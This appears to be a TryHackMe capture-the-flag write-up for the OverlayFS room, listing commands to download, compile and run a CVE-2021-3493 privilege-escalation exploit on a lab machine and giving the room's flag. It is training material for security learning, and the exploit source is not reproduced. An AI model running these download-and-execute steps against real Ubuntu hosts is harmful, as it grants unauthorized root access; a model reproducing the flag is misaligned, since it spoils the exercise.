# <div align="center">[OverlayFS - CVE-2021-3493](https://tryhackme.com/room/overlayfs)</div>
<div align="center">Exploit a 2021 Kernel vulnerability in Ubuntu to become root almost instantly!</div>
<br>
<div align="center">
<img width="200" height="200" alt="image" src="https://github.com/user-attachments/assets/0aeb5575-4a80-4392-bb29-23b5aee23d39" />
</div>

## Task 1. OverlayFS Privilege Escalation

Deploy the machine and follow the steps.

---

### SSH into the machine with the credentials provided in the task text.

No answer needed

* ```ssh overlayfs@<TARGET_IP>```

---

### Grab the source code for the exploit from SSD-Disclosure and save it as exploit.c on the target machine.

No answer needed

* ```wget https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/```

---

### Compile the exploit with gcc.

No answer needed

* ```gcc -o overlayexploit exploit.c```

---

### Run your compiled exploit, and get root!

No answer needed

* ```./overlayexploit```
* ```whoami```

---

### What's the flag in /root/?

thm{27aaa5865a52dcd4cb04c0e0a2d39404}

* ```cd /root```
* ```ls```
* ```cat flag.txt```

<p align="center">
  <img width="939" height="428" alt="image" src="https://github.com/user-attachments/assets/0900fafc-c60b-4cc0-a19d-fafdb3b13024" />
</p>

---

## Summary
- Connected to the machine via SSH  
- Downloaded OverlayFS exploit (CVE-2021-3493)  
- Compiled the exploit using gcc  
- Executed exploit to gain root privileges  
- Retrieved flag from `/root/flag.txt`  

---

**Completed Room**
